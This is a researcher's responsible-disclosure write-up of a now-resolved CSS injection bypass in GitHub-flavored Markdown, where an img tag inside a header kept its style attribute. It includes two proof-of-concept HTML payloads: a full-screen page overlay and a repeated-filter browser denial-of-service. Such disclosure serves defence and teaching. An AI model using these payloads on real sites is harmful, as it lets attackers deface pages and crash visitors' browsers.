# 2023/10 Github markdown vulnerability

### Executive Summary
- **Date of Discovery:** October 8, 2023
- **Date of Initial Report:** October 10, 2023
- **Date of Resolution:** October 15, 2023
- **Identified By:** ([Bytexenon](https://github.com/Bytexenon))
- **Classification of Vulnerability:** CSS Injection 
- **Services Impacted:** Github (https://github.com/), Github-Flavored Markdown (https://github.github.com/gfm/)
- **Extent of Impact:** The vulnerability has a broad reach, affecting multiple URL patterns on GitHub. This includes user and organization profiles, repository main pages, individual issue pages, and Markdown files within any repository. The specific patterns that are impacted include:
  - `https://github.com/<user,organization>` (If a malicious `README.md` exists in the user or organization's repository)
  - `https://github.com/<user,organization>/<repository>` (If the repository has a malicious `README.md` file)
  - `https://github.com/<user,organization>/<repository>/issues/<issue>`
  - `https://github.com/<user,organization>/<repository>/**.md` (Any `.md` file in any directory)
  - `https://github.com/<user,organization>/<repository>/**` (If the directory has a malicious `README.md` file)
  - Additional patterns may be affected, but these are the ones that have been tested so far. Essentially, any URL that renders a user-entered Markdown file was vulnerable.
- **Method of Discovery:** Manual Testing
- **Severity Level:** Low to Medium. The exploit does not enable arbitrary code execution, data theft, or redirection to malicious sites. However, it does allow an attacker to replace an attacker-controlled page (their own Github profile, any of their issues, etc.) with a full-screen image with any CSS styling, or to create a series of images that could crash the browser.
- **Current Status:** Resolved.

### Description

Github's markdown parser, known as cmark, allows for the use of HTML tags to enhance the formatting of the markdown. However, for security reasons, it restricts the use of certain attributes such as style and script to prevent potential Cross-Site Scripting (XSS) and CSS Injection attacks. Despite these restrictions, I discovered a bypass that allows the style attribute to be used within an `<img>` element, but only when this element is nested inside any header (`<h1>`, `<h2>`, `<h3>`, `<h4>`, `<h5>`, `<h6>`) element. This bypass can be exploited to apply arbitrary CSS styles to the image, potentially leading to various forms of visual manipulation on the rendered page.

### Discovery

While experimenting with Github's markdown parser to enhance the aesthetics of my profile's README.md file, I discovered that HTML tags were permissible in their markdown. This is a common feature in most markdown parsers to allow for more complex formatting. However, what caught my attention was the ability to use the style attribute within nested `<img>` elements that were inside any header elements. This was an unexpected behavior as the style attribute is typically restricted to prevent potential XSS/CSS-Injection attacks.

To validate this finding, I created a simple HTML page with a nested `<img>` element inside a header element and applied a style attribute to it. I then uploaded this HTML content to my Github profile's README.md file. To my surprise, the style attribute was successfully rendered, allowing me to apply arbitrary CSS styles to the image.

Intrigued by this discovery, I decided to test this behavior on other Github pages. I found that this bypass was not limited to the README.md file of my profile but was applicable on any Github page that rendered a user-entered Markdown file. This included user and organization profiles, repository main pages, individual issue pages, and Markdown files within any repository. This discovery indicated a widespread impact of this vulnerability, affecting multiple URL patterns on GitHub.

### Proof of Concept

**Replace any page with Github's full-screen favicon:**
```html
<h1>
  <img style="position:fixed;left:0%;top:0%;opacity:100%;z-index:999;width:100%;height:100%;background-image:url(https://github.com/favicon.ico);">
</h1>
```

**DoS attack against any browser that renders the page:**
```html
<h1>
  <img style="position: fixed; filter: blur(0px) saturation(21.75); opacity: 50%; top: 50%; z-index: 9999999; left: 50%; transform: translate(-50%, -50%) rotate(0deg); cursor: url(https://github.com/favicon.ico) 20 2, pointer; width: 100vw; height: 100%; background-image: url(https://github.com/favicon.ico); filter: blur(9999px) brightness(9999%) contrast(9999%) drop-shadow(9999999999px 9999999999px 9999999999px red) invert(9999999999%); transform: rotate(45deg) scale(99999) skew(30deg, 20deg) translate(100px, 100px);">
  <img style="position: fixed; filter: blur(0px) saturation(21.75); opacity: 50%; top: 50%; z-index: 9999999; left: 50%; transform: translate(-50%, -50%) rotate(0deg); cursor: url(https://github.com/favicon.ico) 20 2, pointer; width: 100vw; height: 100%; background-image: url(https://github.com/favicon.ico); filter: blur(9999px) brightness(9999%) contrast(9999%) drop-shadow(9999999999px 9999999999px 9999999999px red) invert(9999999999%); transform: rotate(45deg) scale(99999) skew(30deg, 20deg) translate(100px, 100px);">
  <img style="position: fixed; filter: blur(0px) saturation(21.75); opacity: 50%; top: 50%; z-index: 9999999; left: 50%; transform: translate(-50%, -50%) rotate(0deg); cursor: url(https://github.com/favicon.ico) 20 2, pointer; width: 100vw; height: 100%; background-image: url(https://github.com/favicon.ico); filter: blur(9999px) brightness(9999%) contrast(9999%) drop-shadow(9999999999px 9999999999px 9999999999px red) invert(9999999999%); transform: rotate(45deg) scale(99999) skew(30deg, 20deg) translate(100px, 100px);">
  <img style="position: fixed; filter: blur(0px) saturation(21.75); opacity: 50%; top: 50%; z-index: 9999999; left: 50%; transform: translate(-50%, -50%) rotate(0deg); cursor: url(https://github.com/favicon.ico) 20 2, pointer; width: 100vw; height: 100%; background-image: url(https://github.com/favicon.ico); filter: blur(9999px) brightness(9999%) contrast(9999%) drop-shadow(9999999999px 9999999999px 9999999999px red) invert(9999999999%); transform: rotate(45deg) scale(99999) skew(30deg, 20deg) translate(100px, 100px);">
  <img style="position: fixed; filter: blur(0px) saturation(21.75); opacity: 50%; top: 50%; z-index: 9999999; left: 50%; transform: translate(-50%, -50%) rotate(0deg); cursor: url(https://github.com/favicon.ico) 20 2, pointer; width: 100vw; height: 100%; background-image: url(https://github.com/favicon.ico); filter: blur(9999px) brightness(9999%) contrast(9999%) drop-shadow(9999999999px 9999999999px 9999999999px red) invert(9999999999%); transform: rotate(45deg) scale(99999) skew(30deg, 20deg) translate(100px, 100px);">
</h1>
```
(Could be repeated indefinitely to make it more effective)

### Resolution

The GitHub security team demonstrated exceptional responsiveness and efficiency in addressing the reported vulnerability. Within a week of the initial report, they successfully resolved the issue, reflecting their commitment to maintaining a secure platform. Their cooperation and assistance throughout the process were commendable.

**Screenshots of the partial conversation:**

[My initial report](images/image-1.png)

[Github's response 1](images/image-2.png)

[Github's resolution response](images/image-3.png)

The name of the security engineer has been redacted for privacy reasons.

### Archived pages of the vulnerability

[My profile](https://web.archive.org/web/20231009182556/https://github.com/ByteXenon)

This page was archived after the vulnerability was reported, but before it was resolved. It shows the exploit in action. My profile page has since been updated to remove the exploit, and the exploit was never used for malicious purposes as far as I know (which is really fortunate, because it would have been very easy to do so)

### Closing Thoughts

In retrospect, while I was aware of conventional vulnerability-reporting platforms such as HackerOne, I was not aware at the time that GitHub utilized this platform for their bug bounty program. My primary goal was to ensure the vulnerability was reported as quickly as possible, and as such, I used the most immediate channel available to me, which was GitHub's support form.

Despite this initial misstep, the experience was highly educational. The responsiveness and helpfulness of GitHub's team were commendable. Their handling of the vulnerability report serves as an excellent example for others. I look forward to potentially uncovering more vulnerabilities in their service and reporting them through the appropriate channels. Thank you for taking the time to read this report. Have a great day!
